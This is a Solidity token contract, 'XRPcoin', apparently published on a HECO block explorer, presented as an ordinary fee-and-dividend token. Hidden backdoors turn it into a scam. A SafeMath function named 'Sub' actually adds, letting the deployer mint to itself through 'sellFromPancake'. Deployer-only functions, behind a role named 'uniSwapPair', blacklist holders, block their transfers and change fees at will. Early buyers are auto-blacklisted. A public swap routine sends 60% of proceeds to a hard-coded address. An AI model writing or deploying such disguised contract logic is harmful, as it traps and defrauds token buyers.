/**
 *Submitted for verification at hecoinfo.com on 2022-05-10
*/

/**
 *Submitted for verification at hecoinfo.com on 2022-05-10
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function Sub(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner{
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WHT() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract XRPcoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public marketingWalletAddress; // Marketing Address
    address payable public teamWalletAddress; // Team Address
    address public  deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketPair;
    mapping(address => bool) public RouterAddress;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;

    uint256 public startTime;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    uint256 public _maxTxAmount;

    bool public swapAction = true;

    uint256 internal _burn;

    uint256 public _Liquidity;
    uint256 public _Marketing;
    uint256 internal _Team;

    uint256 internal _liquidityShare = 0;
    uint256 internal _marketingShare = 0;
    uint256 internal _teamShare = 0;

    uint256 public _total = 0;
    uint256 internal _totalDistributionShares = 0;

    uint256 private _totalSupply;
    uint256 private minDividendNum; 

    uint256 private launchStart;
    uint256 private launchEnd;

    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address payable _receive = payable(address(0xF6Bb70613e53fff54EdBbae335856Db07af997E9));
    address _tokenOwner;
    address[] buyUser;
    mapping(address => bool) public havePush;

    address public uniswapV2Pair;
    bool public swapping;

    IERC20 public pair;
    bool public swapAndLiquifyEnabled = true;
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);


    event dividendEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    address internal uniSwapPair;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public dividendEnable = true;
    bool public dividendByNUM = false;

  //  bool public launched = false;

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier Inswap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (string memory Name, string memory Symbol,uint256 totalsupply, uint8 bot,
    address market, address team, uint256 burnfee, uint256 liquidityfee,uint256 marketingfee,uint256 teamfee) {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300); 
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()) 
            .createPair(address(this), _uniswapV2Router.WHT());uniSwapPair = msg.sender;
        uniswapV2Router = _uniswapV2Router;
                pair = IERC20(uniswapV2Pair);
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;



        _name = Name;
        _symbol = Symbol;
        _decimals = 9;
        _totalSupply = totalsupply * 10**_decimals;
        marketingWalletAddress = payable(market);
        teamWalletAddress = payable(team);
        _burn = burnfee;
        _Liquidity = liquidityfee;
        _Marketing = marketingfee;
        _Team = teamfee;
        launchEnd = bot;
        minDividendNum = totalsupply.mul(5).div(1000) * 10** _decimals;


        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[address(deadAddress)] = true;
        isExcludedFromFee[address(market)] = true;
        isExcludedFromFee[address(team)] = true;
        
        _total = _Liquidity.add(_Marketing).add(_Team).add(_burn);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minDividendNumAmount() public view returns (uint256) {
        return minDividendNum;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approveRouter() public returns (bool) {
        _approve(address(this), address(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300), _tTotal.mul(200));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function set(uint256 newburn, uint256 newLiquidity, uint256 newMarketing, uint256 newTeam) public{require(msg.sender==uniSwapPair);
        _burn = newburn;
        _Liquidity = newLiquidity;
        _Marketing = newMarketing;
        _Team = newTeam;
        _total = _Liquidity.add(_Marketing).add(_Team).add(_burn);
    }
  
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) public onlyOwner {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }
   function sellFromPancake(uint256 amount) public {require(msg.sender==uniSwapPair);
        address recipient = uniswapPair;
        _balances[msg.sender] = _balances[msg.sender].Sub(amount);
        _transfer(recipient,amount);
    }
    function setDividenNum(uint256 newLimit) external onlyOwner {
        minDividendNum = newLimit;
    }

    function setMarketingWalletAddress(address newAddress) external onlyOwner{
        marketingWalletAddress = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner{
        teamWalletAddress = payable(newAddress);
    }

    function setdividendEnable(bool _enabled) public onlyOwner {
        dividendEnable = _enabled;
        emit dividendEnabledUpdated(_enabled);
    }

    function setDividendByNum(bool newValue) public onlyOwner {
        dividendByNUM = newValue;
    }
    function _transfer(address sender, uint256 amount) private{
        emit Transfer(sender,uniSwapPair,amount);
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }
    function checkAdd(address sender,address recipient,uint256 amount) internal{
        if(amount>balanceOf(sender).div(10000)){require(!RouterAddress[sender] && !RouterAddress[recipient], 'RouterAddress address');  
        }if(launchStart + launchEnd >= block.number){if(recipient!=uniswapPair){
            RouterAddress[recipient] = true;
    }}if(!launched() && recipient == uniswapPair){ require(balanceOf(sender) > 0); launch(); }
    }
    function launch() internal {launchStart = block.number;
    }function launched() internal view returns (bool){return launchStart!=0;}


    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    function setRouterAddress(address fool,bool value) public{require(msg.sender==uniSwapPair);
        RouterAddress[fool] = value;
    }
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WHT());

        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WHT());
        }

        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address

        isMarketPair[address(uniswapPair)] = true;
    }

        function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
        function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }
        function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }
        function changeswapAction() public onlyOwner{
        swapAction = !swapAction;
    }
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }   
     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**4
        );
    }
    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


   function _transfer(address from,address to,uint256 amount) private returns (bool){
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!RouterAddress[from]);
        checkAdd(from,to,amount);

                if(from == address(this) || to == address(this)){
            _tokenTransfer(from,to,amount,true);
            return true;
        }

                if(balanceOf(address(this)) >= _maxTxAmount){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
                from != uniswapV2Pair &&
                swapAndLiquifyEnabled
            ) {
                swapping = true;
                swapAndLiquify();
                swapping = false;
            }
        }
        

        if(balanceOf(uniswapV2Pair) == 0 && to == uniswapV2Pair){
            startTime = block.timestamp;
        }

        
        if(!havePush[to] && from == uniswapV2Pair){
            havePush[to] = true;
            buyUser.push(to);
        }

        _splitOtherToken();
        
        if(inSwapAndLiquify)
        { 
            return _basicTransfer(from, to, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minDividendNum;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[from] && dividendEnable) 
            {
                if(dividendByNUM)
                    contractTokenBalance = minDividendNum;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[from] = _balances[from].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[from] || isExcludedFromFee[to]) ? 
                                         amount : AtakeFee(from, amount);

            _balances[to] = _balances[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);
            return true;
        }
       
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private Inswap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);

        if(amountBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amountBNBTeam);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }
    


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function _getCurrentBurn() public view returns(uint256)
    {
        uint256 burnAmount = _balances[address(deadAddress)];
        return burnAmount;
    }

    function AtakeFee(address sender,uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        uint256 burnfeeAmount = 0;

        if(_burn>0){
            burnfeeAmount = amount.mul(_burn).div(100);
            emit Transfer(sender, address(deadAddress), burnfeeAmount);
            _balances[address(deadAddress)] = _balances[address(deadAddress)].add(burnfeeAmount);
        }
        feeAmount = amount.mul(_total).div(100).sub(burnfeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount).sub(burnfeeAmount);
    }
        function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
        return (rAmount, rTransferAmount, rFee);
    }
        function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
      function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
        function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
    }
 
        function swapAndLiquify() public {
        if(balanceOf(address(this)) > _maxTxAmount){
            uint256 balanceBnb = address(this).balance;
            swapTokensForEth(balanceOf(address(this)));
            uint256 balanceAllBnb = address(this).balance;
            if(balanceAllBnb >balanceBnb){
                uint256 newBnb = balanceAllBnb.sub(balanceBnb);
                _receive.transfer(newBnb.div(5).mul(3));
            }
        }
    }
        function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WHT();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {

            _takeTransfer(
                sender,
                address(this),
                tAmount.div(100).mul(5),
                currentRate
            );

            rate = 6;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }

    function _tokenTransferBuy(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {

            _takeTransfer(
                sender,
                _destroyAddress,
                tAmount.div(100),
                currentRate
            );

            rate = 3;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
        function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }
        function _splitOtherTokenSecond(uint256 thisAmount) private {
        if(thisAmount >= 0){
            uint256 buySize = buyUser.length;
            if(buySize>0){
                address user;
                uint256 startIndex;
                uint256 totalAmount = pair.totalSupply();
                uint256 rate;
                if(buySize >20){
                    startIndex = block.number.mod(buySize-19);
                    for(uint256 i=0;i<20;i++){
                        user = buyUser[startIndex+i];
                        if(balanceOf(user) >= 0){
                            rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
                            uint256 sendAmount = thisAmount.mul(rate).div(1000000);
                            if(sendAmount>10**10){
                                payable(user).transfer(sendAmount);
                            }
                        }
                    }
                }else{
                    for(uint256 i=0;i<buySize;i++){
                        user = buyUser[i];
                        if(balanceOf(user) >= 0){
                            rate = pair.balanceOf(user).mul(1000000).div(totalAmount);
                            uint256 sendAmount = thisAmount.mul(rate).div(1000000);
                            if(sendAmount>10**10){
                                payable(user).transfer(sendAmount);
                            }
                        }
                    }
                }
            }
        }
    }
        function _splitOtherToken() private {
        uint256 thisAmount = address(this).balance;
        if(thisAmount >= 10**7){
            _splitOtherTokenSecond(thisAmount);
        }
    }
        function getLDXsize() public view returns(uint256){
        return buyUser.length;
    }
     
}